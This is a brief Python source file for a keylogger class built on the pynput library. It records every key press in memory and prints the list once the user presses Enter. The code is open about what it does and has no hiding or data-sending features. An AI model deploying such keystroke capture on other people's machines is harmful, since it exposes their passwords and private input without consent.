from pynput import keyboard
from IKeyLogger import *


class KeyLoggerService(IKeyLogger):
    def __init__(self):
        self.listening = None
        self.key_presses = []

    def start_listening(self) -> None:
        if self.listening is None:
            self.listening = keyboard.Listener(on_press=self.filter)
            self.listening.start()


    def stop_listening(self) -> None:
        if self.listening is not None:
            self.listening.stop()
            self.listening = None

    def get_listen_keys(self) -> List[str]:
        return self.key_presses

    def filter(self, key):

        self.key_presses.append(key)



if __name__ == "__main__":
    logger = KeyLoggerService()
    logger.start_listening()


    input("Press Enter to stop listening...\n")
    logger.stop_listening()

    print("Logged keys:", logger.get_listen_keys())
